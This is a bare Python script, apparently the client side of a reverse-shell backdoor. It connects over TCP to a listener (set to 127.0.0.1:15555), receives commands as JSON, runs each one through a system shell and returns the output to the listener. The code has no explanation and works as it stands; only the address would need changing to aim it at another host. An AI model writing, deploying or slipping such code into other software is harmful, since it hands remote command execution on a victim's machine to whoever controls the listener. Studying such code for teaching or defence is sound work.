#!/usr/bin/python
import socket
import subprocess
import json

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())

def reliable_recv():    
    json_data = ''
    while True:
        try :
            json_data = json_data + sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = (proc.stdout.read() + proc.stderr.read()).decode()
                reliable_send(result)
            except:
                reliable_send("[!!] Can't Execute the Command")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 15555))
print('Connection esablished to Server')

shell()
sock.close()